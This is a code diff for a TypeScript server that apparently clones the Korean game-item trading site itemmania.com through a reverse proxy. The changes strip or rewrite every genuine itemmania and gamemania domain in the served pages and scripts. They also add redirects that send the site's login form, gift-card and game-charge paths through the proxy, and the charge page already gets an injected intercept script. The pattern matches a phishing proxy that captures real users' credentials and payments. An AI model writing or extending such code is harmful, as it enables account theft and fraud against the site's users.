@@ -658,19 +658,37 @@ const PROXY_URL_MAP: [string, string][] = [
   ['https://www.itemmania.com',     '/proxy/'],
 ];
 
-/** HTML 내 모든 외부 링크를 서버에서 미리 치환 */
+/** HTML 전체(JS 문자열 포함)에서 외부 도메인을 제거/치환 */
 function rewriteExternalLinks(html: string): string {
   let result = html;
-  // 알려진 라우트 → 우리 프록시 경로로 교체
+
+  // Step 1: 알려진 라우트 전체 URL → 프록시 경로 (split/join = 전역 치환, unquoted 포함)
   for (const [from, to] of PROXY_URL_MAP) {
-    result = result.split(`href="${from}"`).join(`href="${to}"`);
-    result = result.split(`href='${from}'`).join(`href='${to}'`);
+    result = result.split(from).join(to);
   }
-  // 나머지 itemmania.com / gamemania.co.kr 링크 → 차단 마커
-  result = result.replace(
-    /href=(["'])(https?:\/\/(www\.)?(itemmania\.com|gamemania\.co\.kr)[^"']*?)\1/g,
-    'href="javascript:void(0)" data-blocked="true" data-blocked-url="$2"'
-  );
+
+  // Step 2: 남은 itemmania.com 서브도메인 제거 (→ 상대경로로 변환)
+  for (const host of [
+    'https://img1.itemmania.com',
+    'https://m.itemmania.com',
+    'https://ssadaprice.itemmania.com',
+    'https://www.itemmania.com',
+    'http://www.itemmania.com',
+    'https://itemmania.com',
+    'http://itemmania.com',
+  ]) {
+    result = result.split(host).join('');
+  }
+
+  // Step 3: gamemania.co.kr → 프록시 경로
+  for (const host of [
+    'https://www.gamemania.co.kr',
+    'http://www.gamemania.co.kr',
+    'https://gamemania.co.kr',
+  ]) {
+    result = result.split(host).join('/proxy/gamemania');
+  }
+
   return result;
 }
 
@@ -717,6 +735,20 @@ function serveGameCharge(html: string): string {
   }
   return result + GAMECHARGE_INTERCEPT_SCRIPT;
 }
+
+// 원본 itemmania 경로로 JS가 상대경로 이동할 때 → 프록시 경로로 리다이렉트
+router.get(["/game_charge", "/game_charge/"], (_req, res): void => {
+  res.redirect(302, "/proxy/game-charge");
+});
+router.get(["/portal/giftcard", "/portal/giftcard/"], (_req, res): void => {
+  res.redirect(302, "/proxy/giftcard");
+});
+router.get("/portal/user/p_login_form.html", (_req, res): void => {
+  res.redirect(302, "/proxy/portal/user/p_login_form.html");
+});
+router.get(["/myroom", "/myroom/"], (_req, res): void => {
+  res.redirect(302, "/proxy/");
+});
 
 // 로그인 페이지 라우트 (itemmania 원본 경로 + 단축 경로)
 router.get(
